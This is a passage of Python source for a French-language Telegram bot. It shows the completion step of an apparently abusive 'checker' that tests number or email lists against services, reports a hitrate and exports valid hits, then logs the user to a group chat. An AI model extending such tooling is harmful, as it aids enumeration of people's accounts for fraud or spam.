        final = "Checking annulé ❌" if user.end else "Checking complété ✅"

        if not user.end:
            checked = user.total

        passed = round(time.time() - checker.time)
        pminutes, pseconds = divmod(passed, 60)

        hitrate = round(valid / checked * 100 , len(str(int(checked/100))))


        func = user.send if user.end else user.send_fr
        # user.delete_panel()
        func(
                    utils.BASE(user, f"_〢 {final}_\n\n_〢 Temps écoulé: {int(pminutes)}min {round(pseconds)}s 🕛_\n_〢 Hitrate: {str(hitrate).replace('.0', '')}% 🎯_\n_〢 {checked}/{user.total} NL/ML check dont {valid} valides {'exportés dans le fichier ci-dessous ' if valid else ''}📁_"), 
                    markup=utils.Markups.FULLMENU
        )
        user.export_checked()
        user.checker = None

        user.finish = True


        log_message = (
             f"====== Log ======"
             f"\n| User: @{user.tlg.username}\n"
             f"| UserID: {user.tlg.id}"
             f"\n====== Command ======"
             f"\n[Command:](/check)\n"
             f"Service check: {', '.join(user.toggler.choices)} FINIS\n=================="
           )
        bot.send_message(-4042249897, log_message)


bot.infinity_polling()
